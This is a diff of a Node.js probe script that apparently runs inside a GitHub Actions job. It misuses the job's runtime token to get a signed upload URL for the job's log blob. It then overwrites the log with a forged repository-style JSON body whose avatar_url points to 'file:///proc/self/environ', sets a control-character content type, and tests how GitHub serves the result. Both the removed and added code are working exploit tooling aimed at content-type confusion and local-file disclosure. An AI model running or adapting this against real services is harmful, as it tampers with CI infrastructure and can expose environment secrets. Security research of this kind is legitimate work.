@@ -1,37 +1,16 @@
-import {createHash} from 'node:crypto';
+import {writeFileSync} from 'node:fs';
 import http from 'node:http';
 import https from 'node:https';
-import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
-import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
-import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
+import {createHash} from 'node:crypto';
 
-const ids = getBackendIdsFromToken();
-const client = internalArtifactTwirpClient({maxAttempts: 1});
-const repo = process.env.GITHUB_REPOSITORY;
-const stamp = process.env.GITHUB_RUN_ID;
-const cases = [
-  ['allow-zip', 7, 'application/zip', false, '\u0085application/json'],
-  ['allow-octet', 7, 'application/octet-stream', false, '\u0085application/json'],
-  ['allow-gzip', 7, 'application/gzip', false, '\u0085application/json'],
-  ['allow-tar', 7, 'application/x-tar', false, '\u0085application/json'],
-  ['allow-svg', 7, 'image/svg+xml', false, '\u0085application/json'],
-  ['allow-png', 7, 'image/png', false, '\u0085application/json'],
-  ['allow-plain', 7, 'text/plain', false, '\u0085application/json'],
-  ['allow-html', 7, 'text/html', false, '\u0085application/json'],
-  ['allow-xml-app', 7, 'application/xml', false, '\u0085application/json'],
-  ['allow-xml-text', 7, 'text/xml', false, '\u0085application/json'],
-  ['allow-js', 7, 'application/javascript', false, '\u0085application/json'],
-  ['allow-pdf', 7, 'application/pdf', false, '\u0085application/json'],
-  ['allow-csv', 7, 'text/csv', false, '\u0085application/json'],
-  ['allow-json-control', 7, 'application/json', false, '\u0085application/json'],
-];
+const report={runId:process.env.GITHUB_RUN_ID,repository:process.env.GITHUB_REPOSITORY};
+const sleep=ms=>new Promise(resolve=>setTimeout(resolve,ms));
 
-function sha(bytes) { return createHash('sha256').update(bytes).digest('hex'); }
-function request(url, method='GET', body=null, headers={}) {
-  return new Promise((resolve,reject) => {
-    const target = new URL(url);
-    const transport = target.protocol === 'https:' ? https : http;
-    const req = transport.request(target,{method,headers,timeout:15000},res=>{
+function rawRequest(url,method='GET',body=null,headers={}){
+  return new Promise((resolve,reject)=>{
+    const target=new URL(url);
+    const transport=target.protocol==='https:'?https:http;
+    const req=transport.request(target,{method,headers,timeout:15000},res=>{
       const chunks=[];
       res.on('data',chunk=>chunks.push(chunk));
       res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));
@@ -42,73 +21,100 @@ function request(url, method='GET', body=null, headers={}) {
     req.end();
   });
 }
-function headerHex(response,name){
-  const out=[];
+function contentTypeHex(response){
+  const types=[];
   for(let i=0;i<response.rawHeaders.length;i+=2){
-    if(response.rawHeaders[i].toLowerCase()===name.toLowerCase())
-      out.push(Buffer.from(response.rawHeaders[i+1],'latin1').toString('hex'));
+    if(response.rawHeaders[i].toLowerCase()==='content-type')
+      types.push(Buffer.from(response.rawHeaders[i+1],'latin1').toString('hex'));
   }
-  return out;
+  return types;
 }
-async function upload(url, bytes, type){
-  const response = await request(url,'PUT',bytes,{
-    'x-ms-version':'2025-01-05',
-    'x-ms-blob-type':'BlockBlob',
-    'x-ms-blob-content-type':type,
-    'Content-Type':'application/octet-stream',
-    'Content-Length':String(bytes.length),
+async function githubGet(path){
+  return rawRequest(`https://api.github.com${path}`,'GET',null,{
+    'Authorization':`Bearer ${process.env.GITHUB_TOKEN}`,
+    'Accept':'application/vnd.github.v3+json',
+    'User-Agent':'repo-cassette-log-carrier-probe',
   });
-  if(response.status!==201)throw new Error(`upload HTTP ${response.status} ${response.headers['x-ms-error-code']||''}`);
 }
-async function runCase([label,version,mime,omit,blobType]){
-  const name=`repo-cassette-${stamp}-${label}.json`;
-  const report={label,version,mimePreview: mime===null?null:JSON.stringify(mime).slice(0,120),mimeLength:mime===null?null:mime.length,blobTypeHex:Buffer.from(blobType,'latin1').toString('hex')};
-  try{
-    const args={...ids,name,version};
-    if(!omit)args.mimeType=StringValue.create({value:mime});
-    const created=await client.CreateArtifact(args);
-    if(!created.ok)throw new Error('CreateArtifact returned ok=false');
-    const placeholder=Buffer.from('{}');
-    let activeBlobType=blobType;
-    try{
-      await upload(created.signedUploadUrl,placeholder,activeBlobType);
-      report.blobTypeAccepted=true;
-    }catch(error){
-      report.blobUploadError=String(error.message||error).slice(0,100);
-      activeBlobType='application/json';
-      await upload(created.signedUploadUrl,placeholder,activeBlobType);
-      report.blobTypeAccepted=false;
+
+try{
+  const runtimeToken=process.env.ACTIONS_RUNTIME_TOKEN;
+  const resultsUrl=process.env.ACTIONS_RESULTS_URL;
+  if(!runtimeToken||!resultsUrl)throw new Error('Actions runtime token or results URL missing');
+  const claims=JSON.parse(Buffer.from(runtimeToken.split('.')[1],'base64url').toString());
+  const scope=claims.scp.split(' ').find(value=>value.startsWith('Actions.Results:'));
+  if(!scope)throw new Error('Actions.Results scope missing');
+  const [,workflow_run_backend_id,workflow_job_run_backend_id]=scope.split(':');
+
+  let job;
+  for(let attempt=0;attempt<12&&!job;attempt++){
+    const response=await githubGet(`/repos/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`);
+    report.jobsStatus=response.status;
+    if(response.status===200){
+      const jobs=JSON.parse(response.body.toString()).jobs||[];
+      job=jobs.find(value=>value.status==='in_progress'&&value.name==='probe')||jobs.find(value=>value.status==='in_progress');
     }
-    const done=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
-    if(!done.ok)throw new Error('FinalizeArtifact returned ok=false');
-    const artifactId=String(done.artifactId);
-    report.artifactId=artifactId;
-    const repository=`${repo}/actions/artifacts/${artifactId}/zip`;
-    const body=Buffer.from(JSON.stringify({full_name:repository,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'Repo Cassette',stargazers_count:0}));
-    await upload(created.signedUploadUrl,body,activeBlobType);
-    report.bodySha256=sha(body);
-    for(let retry=0;retry<12;retry++){
-      const api=await request(`https://api.github.com/repos/${repository}`,'GET',null,{
-        'Accept':'application/vnd.github.v3+json',
-        'Authorization':`Bearer ${process.env.GITHUB_TOKEN}`,
-        'User-Agent':'repo-cassette-carrier-probe',
-      });
-      report.githubStatus=api.status;
-      if(api.status===404){await new Promise(r=>setTimeout(r,500));continue;}
-      if(api.status!==302 || !api.headers.location)break;
-      const location=new URL(api.headers.location);
-      report.rsct=location.searchParams.get('rsct');
-      const final=await request(location.href);
+    if(!job)await sleep(300);
+  }
+  if(!job)throw new Error('Current in-progress REST job ID unavailable');
+  report.jobId=String(job.id);
+
+  const signedEndpoint=new URL('/twirp/results.services.receiver.Receiver/GetJobLogsSignedBlobURL',resultsUrl);
+  const signedBody=Buffer.from(JSON.stringify({workflow_run_backend_id,workflow_job_run_backend_id}));
+  const signedResponse=await rawRequest(signedEndpoint.href,'POST',signedBody,{
+    'Authorization':`Bearer ${runtimeToken}`,
+    'Content-Type':'application/json',
+    'Content-Length':String(signedBody.length),
+  });
+  report.signedStatus=signedResponse.status;
+  if(signedResponse.status!==200)throw new Error(`Signed log URL HTTP ${signedResponse.status}: ${signedResponse.body.toString().slice(0,160)}`);
+  const signed=JSON.parse(signedResponse.body.toString());
+  if(!signed.logs_url)throw new Error('Signed log URL absent');
+  const signedUrl=new URL(signed.logs_url);
+  report.uploadPermission=signedUrl.searchParams.get('sp');
+  report.uploadRsct=signedUrl.searchParams.get('rsct');
+
+  const repository=`${process.env.GITHUB_REPOSITORY}/actions/jobs/${job.id}/logs`;
+  const body=Buffer.from(JSON.stringify({
+    full_name:repository,
+    owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},
+    description:'Repo Cassette job log',
+    stargazers_count:0,
+  }));
+  report.repositoryPath=repository;
+  report.bodySha256=createHash('sha256').update(body).digest('hex');
+  report.bodyLength=body.length;
+  const upload=await rawRequest(signedUrl.href,'PUT',body,{
+    'x-ms-version':'2022-11-02',
+    'x-ms-blob-type':'BlockBlob',
+    'x-ms-blob-content-type':'\u0085application/json',
+    'Content-Type':'application/octet-stream',
+    'Content-Length':String(body.length),
+  });
+  report.uploadStatus=upload.status;
+  report.uploadErrorCode=upload.headers['x-ms-error-code']||null;
+  if(upload.status!==201)throw new Error(`Log Blob upload HTTP ${upload.status}: ${upload.body.toString().slice(0,160)}`);
+
+  if((signedUrl.searchParams.get('sp')||'').includes('r')){
+    const direct=await rawRequest(signedUrl.href);
+    report.directStatus=direct.status;
+    report.directContentTypeHex=contentTypeHex(direct);
+    report.directBodyMatch=direct.body.equals(body);
+  }
+  for(let attempt=0;attempt<8;attempt++){
+    const rest=await githubGet(`/repos/${process.env.GITHUB_REPOSITORY}/actions/jobs/${job.id}/logs`);
+    report.restStatus=rest.status;
+    if(rest.status===302&&rest.headers.location){
+      const location=new URL(rest.headers.location);
+      report.restRsct=location.searchParams.get('rsct');
+      const final=await rawRequest(location.href);
       report.finalStatus=final.status;
-      report.contentTypeHex=headerHex(final,'Content-Type');
-      report.bodyMatch=final.body.equals(body);
+      report.finalContentTypeHex=contentTypeHex(final);
+      report.finalBodyMatch=final.body.equals(body);
       break;
     }
-  }catch(error){report.error=String(error.message||error).slice(0,180);}
-  console.log('CARRIER',JSON.stringify(report));
-}
-for(const entry of cases){
-  try{await runCase(entry)}catch(error){
-    console.log('CARRIER_FATAL',JSON.stringify({label:entry[0],error:String(error.message||error).slice(0,180)}));
+    await sleep(300);
   }
-}
+}catch(error){report.error=String(error.message||error).slice(0,220)}
+console.log('LOG_CARRIER',JSON.stringify(report));
+try{writeFileSync(`${process.env.GITHUB_WORKSPACE}/log_carrier_report.json`,JSON.stringify(report));}catch(e){}
